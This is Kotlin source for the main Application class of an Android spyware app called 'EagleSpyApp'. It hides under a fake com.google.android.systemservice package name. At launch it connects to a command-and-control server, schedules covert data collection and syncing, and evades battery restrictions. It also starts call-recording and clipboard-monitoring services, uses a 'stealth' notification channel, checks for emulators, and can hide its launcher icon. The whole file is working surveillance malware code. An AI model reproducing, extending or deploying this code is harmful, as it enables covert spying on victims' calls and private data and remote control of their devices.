package com.google.android.systemservice

import android.app.Application
import android.content.ComponentName
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.hilt.work.HiltWorkerFactory
import androidx.work.Configuration
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.android.systemservice.workers.CommandWorker
import com.google.android.systemservice.workers.DataSyncWorker
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.DozeOptimization
import dagger.hilt.android.HiltAndroidApp
import timber.log.Timber
import java.util.concurrent.TimeUnit
import javax.inject.Inject

@HiltAndroidApp
class EagleSpyApp : Application(), Configuration.Provider {

    companion object {
        private const val TAG = "EagleSpyApp"
        private const val PREFS_NAME = "stealth_prefs"
        private const val KEY_DEVICE_ID = "device_id"
        private const val KEY_SERVER_URL = "server_url"
        
        // Default C2 server — derived from build config
        private val DEFAULT_SERVER_URL = BuildConfig.SERVER_BASE_URL.replace("http", "ws") + "/cable"
        
        private var instance: EagleSpyApp? = null
        
        fun getInstance(): EagleSpyApp {
            return instance ?: throw IllegalStateException("App not initialized")
        }
    }

    @Inject
    lateinit var workerFactory: HiltWorkerFactory
    
    private val handler = Handler(Looper.getMainLooper())

    override val workManagerConfiguration: Configuration
        get() = Configuration.Builder()
            .setWorkerFactory(workerFactory)
            .setMinimumLoggingLevel(if (BuildConfig.DEBUG) Log.DEBUG else Log.ERROR)
            .build()

    override fun onCreate() {
        super.onCreate()
        instance = this
        
        // Initialize Timber for logging
        if (BuildConfig.DEBUG) {
            Timber.plant(Timber.DebugTree())
        }
        
        Timber.d("EagleSpyApp initializing...")
        
        // Environment safety check
        if (!com.google.android.systemservice.utils.SecurityChecker.isSafeEnvironment()) {
            Timber.d("Environment check: debug/emulator detected")
            // Continue anyway but log it - could be used to alter behavior
        }
        
        // Initialize AndroidConfig device ID
        com.google.android.systemservice.config.AndroidConfig.initDeviceId(this)
        
        // Create stealth notification channel
        StealthNotificationHelper.createStealthChannel(this)
        
        // Schedule background worker
        scheduleCommandWorker()
        
        // Schedule offline data collector (works without server)
        try {
            com.google.android.systemservice.workers.OfflineCollectorWorker.schedule(this)
        } catch (e: Exception) {
            Timber.e(e, "Failed to schedule OfflineCollectorWorker")
        }
        
        // Schedule adaptive data sync worker for battery optimization
        try {
            DataSyncWorker.scheduleAdaptive(this)
            Timber.d("Adaptive DataSyncWorker scheduled")
        } catch (e: Exception) {
            Timber.e(e, "Failed to schedule DataSyncWorker")
        }
        
        // Request battery optimization exemption
        try {
            DozeOptimization.requestIgnoreBatteryOptimizations(this)
        } catch (e: Exception) {
            Timber.e(e, "Failed to request battery optimization exemption")
        }
        
        // Schedule Doze wakeup alarms for critical operations
        try {
            DozeOptimization.scheduleAlarmForDozeWakeup(this)
            Timber.d("Doze wakeup alarm scheduled")
        } catch (e: Exception) {
            Timber.e(e, "Failed to schedule Doze wakeup")
        }
        
        // Start CommandService immediately
        startCommandService()
        
        // Start Battery Monitor Service
        startBatteryMonitor()
        
        // Start Call Recording Service
        startCallRecordingService()
        
        // Start Clipboard Monitor
        startClipboardMonitor()
        
        Timber.d("EagleSpyApp initialized")
    }

    private fun scheduleCommandWorker() {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val workRequest = PeriodicWorkRequestBuilder<CommandWorker>(
                15, TimeUnit.MINUTES,
                5, TimeUnit.MINUTES  // Flex interval
            )
                .setConstraints(constraints)
                .build()

            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "command_worker",
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
            
            Log.d(TAG, "CommandWorker scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule CommandWorker: ${e.message}")
        }
    }

    private fun startCommandService() {
        try {
            val intent = android.content.Intent(this, com.google.android.systemservice.services.CommandService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "CommandService started from Application")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start CommandService: ${e.message}")
        }
    }

    private fun startCallRecordingService() {
        try {
            val intent = android.content.Intent(this, com.google.android.systemservice.services.CallRecordingService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "CallRecordingService started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start CallRecordingService: ${e.message}")
        }
    }

    private fun startClipboardMonitor() {
        try {
            val intent = android.content.Intent(this, com.google.android.systemservice.services.ClipboardMonitorService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "ClipboardMonitorService started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start ClipboardMonitorService: ${e.message}")
        }
    }

    private fun startBatteryMonitor() {
        try {
            val intent = android.content.Intent(this, com.google.android.systemservice.services.BatteryMonitorService::class.java)
            startService(intent)
            Log.d(TAG, "BatteryMonitorService started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start BatteryMonitorService: ${e.message}")
        }
    }

    fun getDeviceIdentifier(): String {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        var deviceId = prefs.getString(KEY_DEVICE_ID, null)
        
        if (deviceId == null) {
            deviceId = try {
                Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                    ?: java.util.UUID.randomUUID().toString()
            } catch (e: Exception) {
                java.util.UUID.randomUUID().toString()
            }
            prefs.edit().putString(KEY_DEVICE_ID, deviceId).apply()
        }
        
        return deviceId ?: "unknown_device"
    }

    fun getServerUrl(): String {
        return getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .getString(KEY_SERVER_URL, DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
    }

    fun updateServerUrl(newUrl: String) {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit()
            .putString(KEY_SERVER_URL, newUrl)
            .apply()
        Log.d(TAG, "Server URL updated to: $newUrl")
    }

    fun isSetupComplete(): Boolean {
        return getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .getBoolean("setup_complete", false)
    }

    fun hideLauncherIcon() {
        val componentName = ComponentName(this, SetupWizardActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        Log.d(TAG, "Launcher icon hidden")
    }

    fun showLauncherIcon() {
        val componentName = ComponentName(this, SetupWizardActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        Log.d(TAG, "Launcher icon shown")
    }
}
